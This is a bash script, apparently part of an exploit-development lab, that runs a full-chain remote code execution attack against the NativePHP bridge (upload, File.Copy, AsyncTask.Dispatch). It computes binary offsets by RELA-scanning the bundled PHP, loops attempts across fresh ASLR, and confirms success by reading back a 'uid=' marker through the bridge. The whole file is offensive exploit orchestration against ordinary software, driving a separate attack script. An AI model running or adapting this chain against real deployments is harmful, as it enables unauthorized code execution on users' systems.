#!/bin/bash
# shape9_run.sh — MISSION 9 receipt run: full in-band zero4 RCE through the
# NativePHP bridge (upload -> File.Copy -> AsyncTask.Dispatch), no gdb, no
# baked addresses; offsets via shape9_elfsyms.py RELA-scan of the bundled
# (runner) binary; uid marker read back THROUGH the bridge via /_assets.
set -u
LAB=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab
RECEIPTS=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/receipts
PHP8512=/tmp/php8512_build/plain2/sapi/cli/php
PORT=8811
MARKER=/tmp/pwned_nativephp_rce

mkdir -p "$LAB/storage/framework/async/payload" "$LAB/storage/app/uploads" "$LAB/public" "$RECEIPTS"
rm -f "$MARKER" "$LAB/storage/framework/async/payload/"*.task "$LAB/storage/app/uploads/"* \
      "$LAB/public/shape9_rce_receipt.txt"

echo "############ elfsyms: RELA-scan of the runner binary (bundled-PHP stand-in) ############"
python3 "$LAB/shape9_elfsyms.py" "$PHP8512" | tee "$RECEIPTS/nativephp_elfsyms.log"

echo
echo "############ harness up (runner = shape9_runner.php, NO gdb, USE_ZEND_ALLOC=1) ############"
LAB_RUNNER_SCRIPT=shape9_runner.php NATIVEPHP_RUNNER_PHP="$PHP8512" LAB_RUNNER_ALLOC=1 \
  "$PHP8512" -n -S "127.0.0.1:$PORT" "$LAB/harness.php" > "$LAB/server.log" 2>&1 &
SERVER_PID=$!
up=0
for i in $(seq 1 40); do
  if curl -s -o /dev/null "http://127.0.0.1:$PORT/" 2>/dev/null; then up=1; break; fi
  sleep 0.25
done
if [ "$up" != 1 ]; then echo "[FAIL] server did not come up"; kill "$SERVER_PID" 2>/dev/null; exit 1; fi

echo "############ full-chain attack driver (attempt loop, fresh ASLR per dispatch) ############"
python3 "$LAB/shape9_attack.py" "http://127.0.0.1:$PORT" "$LAB" "$PHP8512" 30 \
  | tee "$RECEIPTS/nativephp_rce_fullchain.log"
RC=${PIPESTATUS[0]}
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null

echo
echo "############ RECEIPT CHECK ############"
if grep -q "uid=" "$RECEIPTS/nativephp_rce_fullchain.log" && grep -q "\[PASS\] FULL zero4 chain" "$RECEIPTS/nativephp_rce_fullchain.log"; then
  echo "[PASS] shape9: env-tuning gap CLOSED — leak->write->call fired end-to-end"
  echo "       through the NativePHP bridge delivery with in-band bootstrap."
  grep -m1 "uid=" "$RECEIPTS/nativephp_rce_fullchain.log"
else
  echo "[FAIL] no uid receipt through the bridge — see receipts/nativephp_rce_fullchain.log (rc=$RC)"
fi
